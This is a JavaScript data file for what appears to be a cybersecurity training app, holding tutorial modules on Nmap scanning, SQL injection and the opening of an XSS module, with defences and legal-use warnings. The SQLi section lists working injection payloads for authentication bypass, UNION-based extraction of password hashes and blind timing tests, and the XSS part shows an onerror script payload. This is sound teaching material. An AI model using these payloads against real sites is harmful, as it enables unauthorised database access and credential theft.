/* ── Splash Screen Controller — runs before any other init ───────────────────
   Shows on cold launch only (sessionStorage flag).
   Total sequence: logo in (0.6s) → text in (0.5s) → bar fill (0.9s) → exit (0.5s)
   ─────────────────────────────────────────────────────────────────────────── */
(function initSplash() {
  const splash = document.getElementById('splash');
  if (!splash) return;

  // Skip on hot reloads / re-navigations within the same session
  if (sessionStorage.getItem('cc_launched')) {
    splash.remove();
    return;
  }
  sessionStorage.setItem('cc_launched', '1');
  window.CCMotion && CCMotion.boot(splash, ['> load modules', '> load tutorials', '> ready']);

  // Bar fill animation ends at ~1.4s, we exit at 1.45s and remove at 1.95s
  setTimeout(() => {
    splash.classList.add('splash-exit');
    setTimeout(() => splash.remove(), 520);
  }, 1450);
})();

/* ═══════════════════════════════════════════════════════════════════════════════
   CyberCompanion — Renderer v1.1
   Modules · Defense Sections · Copy Buttons
   ═══════════════════════════════════════════════════════════════════════════════ */

// ─── SVG Icons ──────────────────────────────────────────────────────────────────
const ICONS = {
  copy:     `<svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><rect x="9" y="9" width="13" height="13" rx="2"/><path d="M5 15H4a2 2 0 0 1-2-2V4a2 2 0 0 1 2-2h9a2 2 0 0 1 2 2v1"/></svg>`,
  check:    `<svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2.5" stroke-linecap="round" stroke-linejoin="round"><polyline points="20 6 9 17 4 12"/></svg>`,
  concept:  `<svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><circle cx="12" cy="12" r="10"/><line x1="12" y1="16" x2="12" y2="12"/><line x1="12" y1="8" x2="12.01" y2="8"/></svg>`,
  analogy:  `<svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><path d="M9.09 9a3 3 0 0 1 5.83 1c0 2-3 3-3 3"/><circle cx="12" cy="12" r="10"/><line x1="12" y1="17" x2="12.01" y2="17"/></svg>`,
  exercise: `<svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><polyline points="4 17 10 11 4 5"/><line x1="12" y1="19" x2="20" y2="19"/></svg>`,
  reference:`<svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><path d="M14 2H6a2 2 0 0 0-2 2v16a2 2 0 0 0 2 2h12a2 2 0 0 0 2-2V8z"/><polyline points="14 2 14 8 20 8"/><line x1="16" y1="13" x2="8" y2="13"/><line x1="16" y1="17" x2="8" y2="17"/></svg>`,
  defense:  `<svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><path d="M12 22s8-4 8-10V5l-8-3-8 3v7c0 6 8 10 8 10z"/></svg>`,
  shield:   `<svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><path d="M12 22s8-4 8-10V5l-8-3-8 3v7c0 6 8 10 8 10z"/></svg>`
};

/* ─── Line icons (stroke, inherit currentColor) — replace emoji ───────────── */
const LI = {
  target:   `<svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><circle cx="12" cy="12" r="9"/><circle cx="12" cy="12" r="4"/><line x1="12" y1="1" x2="12" y2="5"/><line x1="12" y1="19" x2="12" y2="23"/><line x1="1" y1="12" x2="5" y2="12"/><line x1="19" y1="12" x2="23" y2="12"/></svg>`,
  terminal: `<svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><polyline points="4 17 10 11 4 5"/><line x1="12" y1="19" x2="20" y2="19"/></svg>`,
  flask:    `<svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><path d="M9 3h6"/><path d="M10 3v6l-5 9a2 2 0 0 0 1.8 3h10.4a2 2 0 0 0 1.8-3l-5-9V3"/><line x1="7.5" y1="15" x2="16.5" y2="15"/></svg>`,
  shield:   `<svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><path d="M12 22s8-4 8-10V5l-8-3-8 3v7c0 6 8 10 8 10z"/></svg>`,
  signal:   `<svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><path d="M5 12.5a9 9 0 0 1 14 0"/><path d="M8.5 15.5a4.5 4.5 0 0 1 7 0"/><circle cx="12" cy="18.5" r="1"/></svg>`,
  trophy:   `<svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><path d="M8 21h8M12 17v4M7 4h10v5a5 5 0 0 1-10 0z"/><path d="M7 5H4v2a3 3 0 0 0 3 3M17 5h3v2a3 3 0 0 1-3 3"/></svg>`,
  bolt:     `<svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><polygon points="13 2 3 14 11 14 11 22 21 10 13 10 13 2"/></svg>`,
  activity: `<svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><polyline points="22 12 18 12 15 21 9 3 6 12 2 12"/></svg>`,
  lock:     `<svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><rect x="3" y="11" width="18" height="11" rx="2"/><path d="M7 11V7a5 5 0 0 1 10 0v4"/></svg>`,
  globe:    `<svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><circle cx="12" cy="12" r="9"/><line x1="3" y1="12" x2="21" y2="12"/><path d="M12 3a15 15 0 0 1 0 18 15 15 0 0 1 0-18z"/></svg>`,
  gear:     `<svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><circle cx="12" cy="12" r="3"/><path d="M19.4 15a1.65 1.65 0 0 0 .33 1.82l.06.06a2 2 0 1 1-2.83 2.83l-.06-.06a1.65 1.65 0 0 0-1.82-.33 1.65 1.65 0 0 0-1 1.51V21a2 2 0 0 1-4 0v-.09A1.65 1.65 0 0 0 9 19.4a1.65 1.65 0 0 0-1.82.33l-.06.06a2 2 0 1 1-2.83-2.83l.06-.06a1.65 1.65 0 0 0 .33-1.82 1.65 1.65 0 0 0-1.51-1H3a2 2 0 0 1 0-4h.09A1.65 1.65 0 0 0 4.6 9a1.65 1.65 0 0 0-.33-1.82l-.06-.06a2 2 0 1 1 2.83-2.83l.06.06a1.65 1.65 0 0 0 1.82.33H9a1.65 1.65 0 0 0 1-1.51V3a2 2 0 0 1 4 0v.09a1.65 1.65 0 0 0 1 1.51 1.65 1.65 0 0 0 1.82-.33l.06-.06a2 2 0 1 1 2.83 2.83l-.06.06a1.65 1.65 0 0 0-.33 1.82V9a1.65 1.65 0 0 0 1.51 1H21a2 2 0 0 1 0 4h-.09a1.65 1.65 0 0 0-1.51 1z"/></svg>`
};


/* ═══════════════════════════════════════════════════════════════════════════════
   MODULE DATA
   ═══════════════════════════════════════════════════════════════════════════════ */

const MODULES = [

// ─────────────────────────────────────────────────────────────────────────────
// RED 01: Nmap — Network Scanning & Enumeration
// ─────────────────────────────────────────────────────────────────────────────
{
  id: 'nmap', track: 'red', num: '01', short: 'nmap',
  title: 'Nmap — Network Scanning & Enumeration',
  subtitle: 'Master the most widely-used network scanner. Learn every major flag and scan technique for discovering hosts, open ports, and running services.',
  tag: 'Red 01 — Reconnaissance',

  concept: [
    `<strong>Nmap (Network Mapper)</strong> is the de facto standard tool for network discovery and security auditing. A pentester reaches for it first on almost every engagement — before touching a web app, you need to know which hosts are alive, which ports are open, and what is listening on them.`,
    `At its core, Nmap sends specially crafted packets to target hosts and analyses the responses to determine: which <strong>hosts are alive</strong> on a network, which <strong>ports are open</strong>, what <strong>services and versions</strong> are running on those ports, and what <strong>operating system</strong> the target is using.`,
    `Nmap supports dozens of scan types, from stealthy SYN scans that never complete a TCP handshake, to aggressive scans that fingerprint every service and run vulnerability detection scripts. The <strong>Nmap Scripting Engine (NSE)</strong> extends Nmap with hundreds of scripts for tasks like service enumeration and vulnerability scanning.`,
    `Understanding Nmap's flags is critical — each flag changes the scan behavior significantly. This module walks through every major flag group with practical examples, how to install Nmap, and how to read its output.`
  ],

  analogy: { emoji: '🔦', text: `Imagine you're a security guard who just started a night shift at a massive office building. You need to check every floor and every door. A basic walk-through (ping scan) tells you which floors have lights on — i.e., which hosts are alive. Trying each door handle (port scan) tells you which rooms are unlocked. Peeking inside open rooms (version detection) tells you what equipment is inside. Reading the nameplates (OS detection) tells you who occupies each floor. Nmap is your all-in-one flashlight, master key, and notebook.` },

  steps: [
    { title: 'Install Nmap', desc: 'Nmap ships pre-installed on Kali Linux — just open a terminal and type <code>nmap</code> to confirm. On your own machine, install it with your package manager. If Nmap reports that <strong>Npcap is missing</strong> on Windows, install it separately from <a href="https://npcap.com">npcap.com</a> (or use the official interactive installer from <a href="https://nmap.org/download.html">nmap.org/download</a>, which bundles Npcap automatically):', code: { lang: 'bash', text: '# Kali / Debian / Ubuntu (already present on Kali)\nsudo apt install nmap\n\n# macOS (Homebrew)\nbrew install nmap\n\n# Windows (winget)\nwinget install Insecure.Nmap\n\n# Windows (Chocolatey) — also an option\nchoco install nmap\n\n# Verify the install and check the version\nnmap -V' } },
    { title: 'Host Discovery with a Ping Sweep', desc: 'Before scanning ports, confirm a host is actually up. <code>-sn</code> disables port scanning and only performs host discovery (despite the historical name "ping scan", it is not limited to ICMP echo). Run as root/Administrator it sends an ICMP echo request, a TCP SYN to port 443, a TCP ACK to port 80, and an ICMP timestamp request (and ARP instead, on a local Ethernet/Wi-Fi segment); run unprivileged it falls back to a TCP connect attempt on ports 80 and 443. Great for sweeping a whole subnet with CIDR notation:', code: { lang: 'bash', text: 'nmap -sn 192.168.1.0/24' } },
    { title: 'A Basic TCP Scan', desc: 'With no scan-type flag, Nmap runs a SYN scan if you have raw-socket privileges (root/Administrator), or a full TCP connect scan otherwise. It probes the 1,000 most common ports by default. Try it against a host you own or your own machine:', code: { lang: 'bash', text: 'nmap 127.0.0.1' } },
    { title: 'Choosing Which Ports to Scan', desc: 'The <code>-p</code> flag lets you target specific ports or ranges instead of the default top-1000. <code>-p-</code> scans the full range of all 65,535 TCP ports — slower, but exhaustive.', code: { lang: 'bash', text: '# Just two ports\nnmap -p 22,80 127.0.0.1\n\n# A range\nnmap -p 1-1024 127.0.0.1\n\n# Every port\nnmap -p- 127.0.0.1' } },
    { title: 'Service & Version Detection', desc: 'The <code>-sV</code> flag probes each open port with protocol-specific probes to determine the exact service name and version string running behind it — essential for mapping a port number to real software.', code: { lang: 'bash', text: 'nmap -sV 127.0.0.1' } },
    { title: 'SYN Scan (Stealth Scan)', desc: 'The <code>-sS</code> flag performs a SYN scan — Nmap sends a SYN packet and reads the reply (SYN/ACK = open, RST = closed) without ever completing the TCP handshake. It is the default scan type when you have raw-socket privileges, and is faster and quieter than a full connect scan. Requires root/sudo (or Administrator on Windows):', code: { lang: 'bash', text: 'sudo nmap -sS 127.0.0.1' } },
    { title: 'Aggressive Scan', desc: 'The <code>-A</code> flag enables OS detection (<code>-O</code>), version detection (<code>-sV</code>), the default NSE script set (<code>-sC</code>), and a traceroute, all in one command. It is the most information-rich scan Nmap offers, but also the loudest and most easily detected.', code: { lang: 'bash', text: 'sudo nmap -A 127.0.0.1' } },
    { title: 'NSE Script Scanning', desc: 'The Nmap Scripting Engine (NSE) runs Lua scripts against open ports. <code>--script</code> takes a script name or category. <code>http-title</code> fetches the <code>&lt;title&gt;</code> of a web page on the target port without opening a browser — useful for quickly fingerprinting what a web server is hosting.', code: { lang: 'bash', text: 'nmap -p 80 --script http-title 127.0.0.1' } },
    { title: 'Timing Templates', desc: 'Control scan speed with <code>-T</code> (0–5): <code>0</code> (paranoid) and <code>1</code> (sneaky) space out probes to evade intrusion detection; <code>3</code> is the default; <code>4</code> (aggressive) and <code>5</code> (insane) assume a fast, reliable network and scan much faster but are noisier. <code>-T4</code> is the common choice for scanning your own lab network.', code: { lang: 'bash', text: 'nmap -T4 -p- 127.0.0.1' } },
    { title: 'Save Output to Files', desc: 'Always keep a record of a scan. <code>-oN</code> saves normal (human-readable) output, <code>-oX</code> saves XML, <code>-oG</code> saves a greppable format, and <code>-oA</code> writes all three at once using the given base filename (<code>lab_scan.nmap</code>, <code>.xml</code>, <code>.gnmap</code>).', code: { lang: 'bash', text: 'nmap -sV -p 22,80 -oA lab_scan 127.0.0.1' } },
    { title: 'Reading the Output', desc: 'Here is a <code>-sV</code> scan annotated line by line.<br><br><strong>Line 1</strong>: the Nmap version and the scan\'s start time.<br><br><strong>Line 2–3</strong>: which host was scanned and that it responded, with the round-trip latency.<br><br><strong>"Not shown"</strong>: Nmap hides closed ports by default to keep output short — it tells you how many, and why they are marked closed. <code>(conn-refused)</code> means a TCP RST came back; <code>(reset)</code> is used for some other closed-port reasons depending on scan type — either way, "closed" means something answered, unlike "filtered" where nothing did.<br><br><strong>The PORT table</strong>: port/protocol, STATE (open, closed, or filtered), SERVICE (normally looked up from Nmap\'s <code>nmap-services</code> reference file by port number; with <code>-sV</code> it is corrected, if needed, by actually probing the port), and VERSION (only populated by <code>-sV</code>).<br><br><strong>Service Info line</strong> (optional, <code>-sV</code>/<code>-O</code> only): a best-effort OS/CPE guess derived from the services it found — not a full <code>-O</code> OS scan.<br><br><strong>Last line</strong>: a summary of hosts and scan duration.', code: { lang: 'text', text: 'Starting Nmap 7.95 ( https://nmap.org ) at 2026-10-28 10:15 UTC\nNmap scan report for localhost (127.0.0.1)\nHost is up (0.00015s latency).\nNot shown: 998 closed tcp ports (conn-refused)\nPORT   STATE SERVICE VERSION\n22/tcp open  ssh     OpenSSH 8.9p1 Ubuntu 3ubuntu0.1 (Ubuntu Linux; protocol 2.0)\n80/tcp open  http    Apache httpd 2.4.52 ((Ubuntu))\nService Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel\n\nService detection performed. Please report any incorrect results at https://nmap.org/submit/ .\nNmap done: 1 IP address (1 host up) scanned in 6.12 seconds' } },
    { title: 'Common Mistakes', desc: '<strong>1)</strong> Running <code>-sS</code> or <code>-O</code> without <code>sudo</code> — both require a raw socket and Nmap <strong>quits immediately</strong> with an explicit error ("You requested a scan type which requires root privileges. QUITTING!" for <code>-sS</code>; "TCP/IP fingerprinting (for OS scan) requires root privileges. QUITTING!" for <code>-O</code>) rather than silently downgrading.<br><br><strong>2)</strong> Running <code>-A</code> without <code>sudo</code> behaves differently: it does not quit, it silently degrades to a TCP connect scan with no OS detection or traceroute, which can make a scan look less thorough than it was.<br><br><strong>3)</strong> Scanning a host that blocks ICMP and getting "Host seems down" — add <code>-Pn</code> to skip the liveness check and scan anyway.<br><br><strong>4)</strong> Assuming a closed port means "nothing is there" — a <strong>filtered</strong> port (no response at all, or an ICMP error) is different from <strong>closed</strong> (an RST was received); a firewall usually causes filtered.<br><br><strong>5)</strong> Forgetting that <code>-p-</code> and <code>-A</code> on a large network are slow and loud — start with a ping sweep and top ports, then narrow down.', code: null },
    { title: 'Try It — Interactive Nmap Terminal', desc: 'Scroll down to the <strong>Interactive Nmap Terminal</strong> below this tutorial and practise for real. The simulator accepts any command starting with <code>nmap</code> or <code>ping</code> against a safe local target — it never actually needs <code>sudo</code> (there is nothing to elevate in a simulation). On a real Linux box, <code>ping</code> without <code>-c</code> runs forever until you press Ctrl+C, so real-world use is usually <code>ping -c 4 127.0.0.1</code>. Try each of these in turn:', code: { lang: 'bash', text: 'ping 127.0.0.1\nnmap 127.0.0.1\nnmap -sV 127.0.0.1\nnmap -A 127.0.0.1\nnmap -sn 192.168.1.0/24' } },
    { title: 'Legal Use Only', desc: 'Only run Nmap against systems you <strong>own</strong> or are <strong>explicitly authorised</strong> to test — including your own machine, a lab VM you control, or the built-in simulator below. Scanning networks or hosts you do not have permission to test is illegal in most jurisdictions, even a simple ping sweep.', code: null }
  ],

  defense: [
    { title: 'Firewall Rules (iptables / Windows Firewall)', desc: 'Block or rate-limit incoming probe packets. Only expose ports that must be publicly accessible. Drop packets to unused ports silently (don\'t reject — rejecting confirms the host is alive).' },
    { title: 'Close Unnecessary Ports', desc: 'Every open port is a potential attack surface. Disable services you don\'t need. Run <code>ss -tlnp</code> or <code>netstat -tlnp</code> regularly to audit listening services.' },
    { title: 'Intrusion Detection / Prevention Systems', desc: 'Deploy IDS/IPS (Snort, Suricata) to detect Nmap scan patterns. Many can distinguish between SYN scans, OS fingerprinting, and NSE script traffic.' },
    { title: 'Banner Obfuscation', desc: 'Modify service banners to hide version information. For example, configure Apache to show "Server: " with no version string. This doesn\'t fix vulnerabilities but slows down attackers.' }
  ],

  payloads: { headers: ['Flag', 'Purpose', 'Example'], rows: [
    ['-sS',          'TCP SYN scan (stealth, default with root)',       'sudo nmap -sS target'],
    ['-sT',          'TCP Connect scan (no root needed)',               'nmap -sT target'],
    ['-sU',          'UDP port scan',                                    'sudo nmap -sU target'],
    ['-sV',          'Service/version detection on open ports',          'nmap -sV target'],
    ['-O',           'OS fingerprinting / detection',                    'sudo nmap -O target'],
    ['-A',           'Aggressive (OS + version + scripts + traceroute)','sudo nmap -A target'],
    ['-sC',          'Default NSE script scan',                          'nmap -sC target'],
    ['--script X',   'Run specific NSE script(s) or categories',         'nmap --script http-enum target'],
    ['-p PORTS',     'Scan specific ports or ranges',                    'nmap -p 22,80,443 target'],
    ['-p-',          'Scan ALL 65535 ports',                              'nmap -p- target'],
    ['--top-ports N','Scan the N most common ports',                     'nmap --top-ports 200 target'],
    ['-Pn',          'Skip host discovery (treat host as up)',           'nmap -Pn target'],
    ['-sn',          'Ping sweep only (no port scan)',                   'nmap -sn 192.168.1.0/24'],
    ['-T0 to -T5',   'Timing template (0=paranoid, 5=insane)',          'nmap -T4 target'],
    ['-oN FILE',     'Output in normal text format',                     'nmap -oN results.txt target'],
    ['-oA BASE',     'Output in all formats (normal, XML, grepable)',   'nmap -oA results target'],
    ['-v / -vv',     'Increase output verbosity',                        'nmap -vv target'],
    ['--open',       'Show only open ports in output',                   'nmap --open target']
  ]}
},

// ─────────────────────────────────────────────────────────────────────────────
// RED 02: SQL Injection (SQLi)
// ─────────────────────────────────────────────────────────────────────────────
{
  id: 'sqli', track: 'red', num: '02', short: 'sqli',
  title: 'SQL Injection (SQLi)',
  subtitle: 'Understand how unsanitized user input can manipulate backend database queries to leak data or bypass authentication.',
  tag: 'Red 02 — Database Exploitation',

  concept: [
    `Most web applications store data in a <strong>relational database</strong> (MySQL, PostgreSQL, SQLite, MSSQL). When you submit a form — like a login or search box — the application builds an <strong>SQL query</strong> using your input, then sends it to the database.`,
    `A pentester reaches for SQL injection whenever a parameter (a form field, URL query string, cookie, or JSON body value) feeds into a query without being properly parameterized. For example, a login form might build: <code>SELECT * FROM users WHERE username = 'your_input' AND password = 'your_password'</code>. If the developer concatenates your input directly into the query string instead of treating it as data, you can inject your own SQL syntax.`,
    `By inserting a carefully crafted string like <code>' OR '1'='1</code>, you change the query's logic so the <code>WHERE</code> clause always evaluates to true — effectively bypassing the password check and returning every row instead of none.`,
    `SQL injection can lead to <strong>complete database compromise</strong>: reading records you shouldn't see, extracting password hashes with <code>UNION SELECT</code>, or — in the worst cases — writing to the database or reading files via engine-specific functions. This module covers it manually; the SQLmap module later automates the same logic.`
  ],

  analogy: { emoji: '🏦', text: `Imagine walking into a bank and handing the teller a withdrawal slip. Normally you write your account number and amount. But what if the teller blindly reads whatever you write? You could write: "Withdraw $100 from account #1234 OR just give me everything from every account." Because the teller doesn't validate the slip, they hand over the entire vault. That's SQL Injection.` },

  steps: [
    { title: 'What You Need', desc: 'Nothing to install. A browser with DevTools (<code>F12</code>) is enough to watch requests and responses; Kali ships Firefox (and Burp Suite, covered in a later module) preinstalled for the same job. Everything in this tutorial is practised in the built-in SQLi Practice Lab and standalone SQLi Lab below — no target setup required.', code: null },
    { title: 'Recognise the Vulnerable Pattern', desc: 'SQL injection exists because of string concatenation, not because of any particular framework. Whenever you see user input dropped straight into a query string like this, the WHERE clause can be rewritten by anything you type in the input field:', code: { lang: 'text', text: "-- Server-side pseudocode (vulnerable):\nquery = \"SELECT * FROM users WHERE email = '\" + input_email + \"' AND password = '\" + input_password + \"'\"" } },
    { title: 'Test for Injection with a Single Quote', desc: 'The fastest test for SQLi is breaking the query syntax. In the SQLi Practice Lab below, type a single quote (<code>&#39;</code>) into the email field and submit. If you get a database error or a different response than a normal failed login, the field is concatenating your input unsafely.', code: { lang: 'text', text: "email: '\npassword: anything" } },
    { title: 'Authentication Bypass with a Tautology', desc: 'The classic payload makes the WHERE clause always true, then comments out the rest of the query so the password check never runs. <code>--</code> is a line comment in MySQL, PostgreSQL and SQLite — MySQL specifically requires a <strong>trailing space</strong> after the two dashes (<code>-- </code>) for it to count as a comment. <code>#</code> is a MySQL-specific inline comment marker; in a URL it must be percent-encoded as <code>%23</code>, since a bare <code>#</code> starts a URL fragment instead of reaching the server.', code: { lang: 'text', text: "email: ' OR 1=1-- \npassword: anything" } },
    { title: 'Target a Specific Account', desc: 'A second classic bypass targets one specific account instead of "all rows": comment out the password check entirely after supplying a known or guessed username.', code: { lang: 'text', text: "email: admin@site.com'-- \npassword: anything" } },
    { title: 'Determine the Column Count for UNION', desc: 'Before a UNION-based injection works, the injected SELECT must return the same number of columns as the original query. The reliable way to find it is <code>ORDER BY</code>: start at 1 and increase. Each number up to the real column count sorts normally with no error; the first number <strong>past</strong> the real count throws a "column out of range" style error. The column count is the <strong>last number that did not error</strong> — not that number minus one. (A <code>UNION SELECT NULL,NULL,...</code> probe works differently: any mismatch, too few <em>or</em> too many columns, throws an error; only the exact count succeeds, so there is nothing to subtract there either.)', code: { lang: 'text', text: "' ORDER BY 1--   (no error)\n' ORDER BY 2--   (no error)\n' ORDER BY 3--   (error: Unknown column) -> query has 2 columns" } },
    { title: 'Extract Data with UNION SELECT', desc: 'Once you know the column count, append your own SELECT to pull data the application never meant to show you — here, usernames and password hashes from a users table.', code: { lang: 'text', text: "' UNION SELECT username, password FROM users-- " } },
    { title: 'Practise in the SQLi Practice Lab', desc: 'Scroll down to the <strong>SQLi Practice Lab</strong> below. It simulates <code>SELECT * FROM users WHERE email=&#39;?&#39; AND password=&#39;?&#39;</code> and shows you the exact generated query plus the server response for each payload you try, including a SQL syntax error for an unmatched quote and an "Unknown column" error if you push <code>ORDER BY</code> past the simulated column count. Click the quick-payload chips, or type your own.', code: null },
    { title: 'Common Mistakes', desc: '<strong>1)</strong> Forgetting the comment marker — without <code>-- </code> or <code>#</code>, the rest of the original query (like the password check) still runs and the tautology alone may not be enough.<br><br><strong>2)</strong> Assuming quotes are always needed — in a <strong>numeric</strong> context (an ID passed with no surrounding quotes in the original query), adding a stray <code>&#39;</code> usually just <strong>breaks the syntax</strong> instead of doing nothing; inject without a quote instead, e.g. <code>1 OR 1=1</code>. If the backend instead wraps values in <strong>double</strong> quotes, use <code>&quot;</code> as your breakout character, not <code>&#39;</code>.<br><br><strong>3)</strong> Wrong column count on UNION — a mismatched <code>UNION SELECT</code> throws a database error instead of data, so always confirm the count first with <code>ORDER BY</code>.<br><br><strong>4)</strong> Treating every error page as a confirmed vulnerability — a generic 500 error can also mean an unrelated bug, so look for a specific database error message (e.g. mentioning SQL syntax) before concluding the field is injectable.', code: null },
    { title: 'Try It — Standalone SQLi Lab', desc: 'For a fuller walkthrough with a live SQL debug panel, open the standalone <strong>SQLi Lab</strong> from the Interactive Challenges list below ("Launch SQLi Lab"). It runs entirely offline inside the app — no setup required.', code: null },
    { title: 'Legal Use Only', desc: 'Only try these payloads against the built-in SQLi Practice Lab and standalone SQLi Lab, or against a database and application you own or are explicitly authorised to test. Submitting SQL injection payloads to a real site without permission is illegal.', code: null }
  ],

  defense: [
    { title: 'Parameterized Queries / Prepared Statements', desc: 'The #1 defense. Use placeholders (<code>?</code> or <code>:name</code>) instead of string concatenation. The database driver treats user input as data, never as SQL syntax. Example in PHP: <code>$stmt = $pdo->prepare("SELECT * FROM users WHERE id = ?"); $stmt->execute([$id]);</code>' },
    { title: 'Input Validation & Whitelisting', desc: 'If a field should be a number, cast it to an integer. If it\'s a name, allow only alphanumeric characters. Reject anything that doesn\'t match the expected pattern.' },
    { title: 'Least-Privilege Database Accounts', desc: 'The web application\'s database user should have only SELECT/INSERT/UPDATE on the tables it needs — never DBA or root privileges. This limits the damage even if SQLi succeeds.' },
    { title: 'Web Application Firewall (WAF)', desc: 'Deploy a WAF (e.g., ModSecurity) to detect and block common SQLi patterns in real time. Not a replacement for secure code, but a valuable layer of defense.' },
    { title: 'Generic Error Handling', desc: 'Never expose raw database errors to the user. Use generic error pages. Detailed SQL error messages reveal table names, column types, and query structure to attackers.' }
  ],

  payloads: { headers: ['Payload', 'Purpose', 'Risk'], rows: [
    ["' OR '1'='1",                          'Tautology — bypasses WHERE clause, returns all rows',       'High'],
    ["' OR '1'='1'-- -",                     'Tautology with comment — ignores remaining SQL',            'High'],
    ["' UNION SELECT null,null-- -",         'Column count detection for UNION-based injection',           'Medium'],
    ["' UNION SELECT user(),version()-- -",  '(MySQL) Extracts current DB user and version string',       'High'],
    ["' UNION SELECT current_user,version()-- -", '(PostgreSQL) Same idea — current_user and version()', 'High'],
    ["' UNION SELECT SYSTEM_USER,@@version-- -",  '(MSSQL) Same idea — SYSTEM_USER and @@version',        'High'],
    ["' UNION SELECT NULL,sqlite_version()-- -",  '(SQLite) Same idea — sqlite_version()',                'High'],
    ["' UNION SELECT table_name,null FROM information_schema.tables-- -", '(MySQL/PostgreSQL/MSSQL — ANSI information_schema) Enumerates all table names', 'High'],
    ["' UNION SELECT name,null FROM sqlite_master WHERE type='table'-- -", '(SQLite — no information_schema) Enumerates all table names', 'High'],
    ["' UNION SELECT column_name,null FROM information_schema.columns WHERE table_name='users'-- -", '(MySQL/PostgreSQL/MSSQL) Extracts column names from target table', 'High'],
    ["' AND 1=1-- -",                        'Boolean-based blind test — page normal if true',             'Medium'],
    ["' AND 1=2-- -",                        'Boolean-based blind test — page changes if false',           'Medium'],
    ["' AND SLEEP(5)-- -",                   '(MySQL) Time-based blind test — delays response by 5 seconds', 'Medium'],
    ["' AND pg_sleep(5)-- -",                '(PostgreSQL) Time-based blind — same idea as SLEEP(5)',      'Medium'],
    ["'; WAITFOR DELAY '0:0:5'-- -",         '(MSSQL) Time-based blind via a stacked query',                'Medium'],
    ["admin@site.com'--",                    'Targeted auth bypass — comments out the password check',     'High'],
    ["email=%27+OR+1%3D1--&password=x",      'URL-encoded tautology, as seen in a Burp Repeater request',  'High']
  ]}
},

// ─────────────────────────────────────────────────────────────────────────────
// RED 03: Cross-Site Scripting (XSS)
// ─────────────────────────────────────────────────────────────────────────────
{
  id: 'xss', track: 'red', num: '03', short: 'xss',
  title: 'Cross-Site Scripting (XSS)',
  subtitle: 'Learn how injecting malicious client-side scripts can hijack user sessions and manipulate web pages.',
  tag: 'Red 03 — Client-Side Attacks',

  concept: [
    '<strong>Cross-Site Scripting (XSS)</strong> occurs when an application includes untrusted data in a web page without proper validation or escaping. This allows an attacker to execute malicious JavaScript in the victim\'s browser.',
    '<strong>Reflected XSS</strong> happens when user input is immediately returned (reflected) by the web application in an error message, search result, or any other response. The payload is typically delivered via a crafted link.',
    '<strong>Stored XSS</strong> (Persistent) is more dangerous. The malicious script is saved on the target server (e.g., in a database via a comment or profile field) and executed every time a user views the infected page.',
    '<strong>DOM-based XSS</strong> occurs entirely in the browser when client-side JavaScript takes data from an attacker-controllable source (like the URL hash) and passes it to a dangerous sink (like <code>innerHTML</code> or <code>eval()</code>).'
  ],

  analogy: { emoji: '\uD83C\uDFAD', text: 'Imagine putting up a poster on a community noticeboard. Normally, you just write text. But if the noticeboard doesn\'t restrict what you pin up, you could pin a magical set of instructions that hypnotize anyone who reads them. When a victim looks at the board, they unknowingly execute your instructions \u2014 perhaps handing over their wallet. XSS is injecting those magical instructions (JavaScript) into a webpage.' },

  steps: [
    { title: 'What You Need', desc: 'Nothing to install. A browser with DevTools (<code>F12</code>) is enough to inspect how your input comes back; Kali ships Firefox (and Burp Suite, covered in a later module) preinstalled for the same job. Everything below is practised in the XSS Injection Sandbox further down this page — no target setup required.', code: null },
    { title: 'Spot the Vulnerable Pattern', desc: 'XSS exists whenever user input is written into a page\'s HTML without encoding. The vulnerable server-side code usually looks like simple string concatenation or template interpolation with no escaping function applied:', code: { lang: 'html', text: '<!-- Vulnerable template: renders the search term as raw HTML -->\n<p>Showing results for: ${searchTerm}</p>' } },
    { title: 'Confirm Reflected XSS', desc: 'In the XSS Injection Sandbox below, type a harmless HTML tag — not a script — into the payload field and inject it. If it renders as real HTML instead of literal text, the page is not encoding your input.', code: { lang: 'html', text: '<h1>test</h1>' } },
    { title: 'Read the Reflected Output', desc: 'Here is what the sandbox\'s page source looks like after injecting an <code>&lt;img&gt;</code> payload into the search box, annotated.<br><br>A properly encoded page would show the literal characters <code>&amp;lt;img ...&amp;gt;</code> as visible text — a harmless string with no HTML meaning.<br><br>Instead the raw <code>&lt;</code> and <code>&gt;</code> characters appear unescaped in the HTML, which means the browser parses them as a real <code>&lt;img&gt;</code> tag rather than as text — and once that tag exists, its <code>onerror</code> handler runs as script. A raw angle bracket where you expected text is the tell that output is not being encoded.', code: { lang: 'html', text: "<p>Showing results for: <img src=x onerror=alert('xss')></p>" } },
